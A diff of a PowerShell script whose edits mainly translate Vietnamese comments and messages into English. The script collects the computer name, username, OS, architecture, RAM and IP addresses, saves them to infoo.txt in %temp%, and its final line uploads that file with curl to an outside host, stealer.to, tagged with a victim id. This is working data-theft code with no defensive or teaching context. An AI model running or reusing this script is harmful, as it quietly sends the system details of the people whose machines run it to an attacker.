@@ -1,31 +1,31 @@
-# Đường dẫn lưu file tại %temp%
+# Path to save the file in %temp%
 $tempPath = [System.IO.Path]::Combine($env:TEMP, "infoo.txt")
 
-# Thu thập thông tin máy tính
+# Collect computer information
 $computerInfo = @{
-    "ComputerName" = $env:COMPUTERNAME       # Tên máy tính
-    "Username" = $env:USERNAME               # Tên người dùng
-    "OS" = (Get-WmiObject -Class Win32_OperatingSystem).Caption  # Hệ điều hành
-    "Architecture" = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture  # Kiến trúc hệ điều hành
+    "ComputerName" = $env:COMPUTERNAME       # Computer name
+    "Username" = $env:USERNAME               # Username
+    "OS" = (Get-WmiObject -Class Win32_OperatingSystem).Caption  # Operating system
+    "Architecture" = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture  # Operating system architecture
     "RAM (GB)" = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2) # RAM
-    "IP Address" = (Test-Connection -ComputerName (hostname) -Count 1).IPv4Address.IPAddressToString  # Địa chỉ IP
+    "IP Addresses" = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' }).IPAddress -join ", "  # IP addresses
 }
 
-# Chuyển đổi thông tin thành chuỗi có định dạng dễ đọc
+# Convert information into a readable formatted string
 $infoText = @"
-Thông tin hệ thống máy tính:
+Computer System Information:
 ----------------------------------------
-Tên máy tính: $($computerInfo.ComputerName)
-Người dùng: $($computerInfo.Username)
-Hệ điều hành: $($computerInfo.OS)
-Kiến trúc: $($computerInfo.Architecture)
+Computer Name: $($computerInfo.ComputerName)
+Username: $($computerInfo.Username)
+Operating System: $($computerInfo.OS)
+Architecture: $($computerInfo.Architecture)
 RAM (GB): $($computerInfo.'RAM (GB)')
-Địa chỉ IP: $($computerInfo.'IP Address')
+IP Addresses: $($computerInfo.'IP Addresses')
 ----------------------------------------
 "@
 
-# Lưu thông tin vào file infoo.txt tại %temp%
+# Save the information to the file infoo.txt in %temp%
 $infoText | Out-File -FilePath $tempPath -Encoding UTF8
 
-Write-Host "Thông tin đã được lưu tại $tempPath"
+Write-Host "Information has been saved to $tempPath"
 cmd.exe /c "curl -F ""file=@$tempPath"" https://stealer.to/post?uniqueid=9a181e8a"
